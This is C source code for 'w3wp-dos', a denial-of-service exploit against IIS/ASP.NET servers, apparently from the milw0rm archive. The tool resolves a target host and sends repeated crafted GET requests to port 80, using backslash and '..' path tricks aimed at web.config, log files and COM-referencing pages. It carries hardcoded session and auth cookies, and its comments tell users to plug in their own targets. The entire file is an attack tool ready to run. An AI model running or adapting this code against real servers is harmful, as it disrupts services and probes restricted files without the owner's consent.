// w3wp-dos.c
//

#include "stdafx.h"

#pragma comment (lib,"ws2_32")

#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdio.h>
#include <ctype.h>

char * pszUnauthLinks(DWORD);

#define portno	80

int main(int argc, CHAR* argv[])
{
	char	szWorkBuff[100];
	DWORD	dwCount = 0, dwCounter;
	int	iCnt = 0, iCount = 0;

	SOCKET	conn_socket; 
	WSADATA wsaData;
	struct	sockaddr_in sin;
	struct	hostent *phostent;
	char	*pszTargetHost = new char[MAX_PATH]; 
	UINT	uAddr; 

	if (argc<2)
	{
		printf("============================================\n");
		printf("\t\t w3wp-dos by Debasis Mohanty\n");
		printf("\t\t www.hackingspirits.com\n");
		printf("============================================\n");

		printf("\nUsage: w3wpdos <HostIP / HostName> \n\n");

		exit(0);
	}

	int iRetval; 
	if((iRetval = WSAStartup(0x202,&wsaData)) != 0) {
		printf( "WSAStartup failed with error %d\n",iRetval);
		WSACleanup(); exit(1); }

	// Make a check on the length of the parameter provided
	if (strlen(argv[1]) > MAX_PATH)	{ 
		printf( "Too long parameter ....\n"); exit(1); }
	else
		strcpy(pszTargetHost, argv[1]);

	// Resolve the hostname into IP address or vice-versa
	if(isalpha(pszTargetHost[0])) 
		phostent = gethostbyname(pszTargetHost);
	else  { 
		uAddr = inet_addr(pszTargetHost);
		phostent = gethostbyaddr((char *)&uAddr,4,AF_INET);

		if(phostent != NULL)
			wsprintf( pszTargetHost, "[+] %s", phostent->h_name);
		else	{
			printf( "Failed to resolve IP address, please provide host name.\n" );
			WSACleanup();
			exit(1);	
		}
	}

	if (phostent == NULL )	{
		printf("Cannot resolve address [%s]: Error %d\n", pszTargetHost, 
			WSAGetLastError());

		WSACleanup();
		printf( "Target host seems to be down or the program failed to resolve host name.");
		printf( "Press enter to exit" );

		getchar();
		exit(1); }

	// Initialise Socket info
	memset(&sin,0,sizeof(sin));
	memcpy(&(sin.sin_addr),phostent->h_addr,phostent->h_length);
	sin.sin_family = phostent->h_addrtype;
	sin.sin_port = htons(portno);

	conn_socket = socket(AF_INET, SOCK_STREAM, 0); 
	if (conn_socket < 0 )	{
		printf("Error Opening socket: Error %d\n", WSAGetLastError());
		WSACleanup();

		return -1;}

	printf("============================================\n");
	printf("\t\t w3wp-dos by Debasis Mohanty\n");
	printf("\t\t www.hackingspirits.com\n");
	printf("============================================\n");

	printf("[+] Host name: %s\n", pszTargetHost);
	wsprintf( szWorkBuff, "%u.%u.%u.%u", 
		sin.sin_addr.S_un.S_un_b.s_b1,
		sin.sin_addr.S_un.S_un_b.s_b2,
		sin.sin_addr.S_un.S_un_b.s_b3,
		sin.sin_addr.S_un.S_un_b.s_b4 );
	printf("[+] Host IP: %s\n", szWorkBuff);

	closesocket(conn_socket);

	printf("[+] Ready to generate requests\n");

	/* The count should be modified depending upon the 
	number of links in the szBuff array	*/
	while(dwCount++ < 10) 
	{						

		conn_socket = socket(AF_INET, SOCK_STREAM, 0);
		memcpy(phostent->h_addr, (char *)&sin.sin_addr, phostent->h_length);
		sin.sin_family = AF_INET;
		sin.sin_port = htons(portno);

		if(connect(conn_socket, (struct sockaddr*)&sin,sizeof(sin))!=0)
			perror("connect");

		printf( "[%i] %s", dwCount, pszUnauthLinks(dwCount));
		for(dwCounter=1;dwCounter < 9;dwCounter++) 
		{
			send(conn_socket,pszUnauthLinks(dwCount), strlen(pszUnauthLinks(dwCount)),0);

			char *szBuffer = new char[256];
			recv(conn_socket, szBuffer, 256, 0);
			printf(".");
			// 			if( szBuffer != NULL) 
			//				printf("%s", szBuffer);
			delete szBuffer;
			Sleep(100);
		}
		printf("\n");
		closesocket(conn_socket);
	}

	return 1;
}


char * pszUnauthLinks( DWORD dwIndex )
{
	char	*szBuff[10];
	TCHAR	*szGetReqH = new char[1024]; 

	/*	Modify the list of links given below to your asp.net links. The list should carry links which refer to any COM components and as well as other restricted links under the asp.net app path. 	*/

	szBuff[1] = "GET /aspnet-app\\web.config";
	szBuff[2] = "GET /aspnet-app\\../aspnetlogs\\log1.logs";
	szBuff[3] = "GET /aspnet-app\\default-userscreen.aspx";
	szBuff[4] = "GET /aspnet-app\\users/config.aspx";
	szBuff[5] = "GET /aspnet-app\\links/anycomref.aspx";	//
	szBuff[6] = "GET /aspnet-app\\com-ref-link1.aspx";		// Links of pages referring 
	szBuff[7] = "GET /aspnet-app\\com-ref-link2.aspx";		// COM components.
	szBuff[8] = "GET /aspnet-app\\com-ref-link3.aspx";		//
	szBuff[9] = "GET /aspnet-app\\com-ref-link4.aspx";		//

	/* Prepare the GET request for the desired link */
	strcpy(szGetReqH, szBuff[dwIndex]);
	strcat(szGetReqH, " HTTP/1.1\r\n");
	strcat(szGetReqH, "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n");
	strcat(szGetReqH, "Accept-Language: en-us\r\n");
	strcat(szGetReqH, "Accept-Encoding: gzip, deflate\r\n");
	strcat(szGetReqH, "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)\r\n");
	strcat(szGetReqH, "Host: \r\n" );
	strcat(szGetReqH, "Connection: Keep-Alive\r\n" );

	/* Insert a valid Session Cookie and ASPVIEWSTATE to get more effective result */
	strcat(szGetReqH, "Cookie: ASP.NET_SessionId=35i2i02dtybpvvjtog4lh0ri;\r\n" );
	strcat(szGetReqH, ".ASPXAUTH=6DCE135EFC40CAB2A3B839BF21012FC6C619EB88C866A914ED9F49D67B0D01135F744632F1CC480589912023FA6D703BF02680BE6D733518A998AD1BE1FCD082F1CBC4DB54870BFE76AC713AF05B971D\r\n\r\n" );

	// return szBuff[dwIndex];
	return szGetReqH;
}

// milw0rm.com [2006-03-22]
